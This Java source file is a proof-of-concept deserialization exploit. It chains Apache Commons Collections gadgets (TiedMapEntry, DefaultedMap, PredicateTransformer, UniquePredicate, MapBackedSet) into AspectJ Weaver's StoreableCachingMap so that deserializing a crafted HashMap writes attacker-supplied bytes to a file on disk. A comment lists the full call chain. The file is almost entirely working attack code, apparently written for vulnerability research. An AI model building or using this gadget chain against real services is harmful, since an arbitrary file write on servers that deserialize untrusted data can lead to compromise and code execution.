package com.example.AspectJWeaver;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.functors.PredicateTransformer;
import org.apache.commons.collections.functors.UniquePredicate;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.set.MapBackedSet;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class POC_1 {

    /***
     * <java.util.HashMap: void readObject(java.io.ObjectInputStream)>
     * <java.util.HashMap: int hash(java.lang.Object)>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.apache.commons.collections.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.PredicateTransformer: java.lang.Object transform(java.lang.Object)>
     * <org.apache.commons.collections.functors.UniquePredicate: int evaluate(java.lang.Object)>
     * <org.apache.commons.collections.set.MapBackedSet: boolean add(java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.String writeToPath(java.lang.String,byte[])>
     * <java.io.FileOutputStream: void write(byte[])>
     */

    public static void main(String[] args) throws Exception {
        Map scm = (Map) ReflectionUtil.createObject("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap",
                new Class[]{String.class, int.class},
                new Object[]{"D:/temp", 12});

        byte[] content = Files.readAllBytes(Paths.get("./src/main/java/com/example/Evil/evil"));
        MapBackedSet mbs = (MapBackedSet) MapBackedSet.decorate(scm, content);
        UniquePredicate p = new UniquePredicate();
        ReflectionUtil.setField(p, "iSet", mbs);
        PredicateTransformer pt = new PredicateTransformer(p);

        DefaultedMap d = new DefaultedMap("1");
        TiedMapEntry t = new TiedMapEntry(d, "evil.txt");
        HashMap map = new HashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(d, "value", pt);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
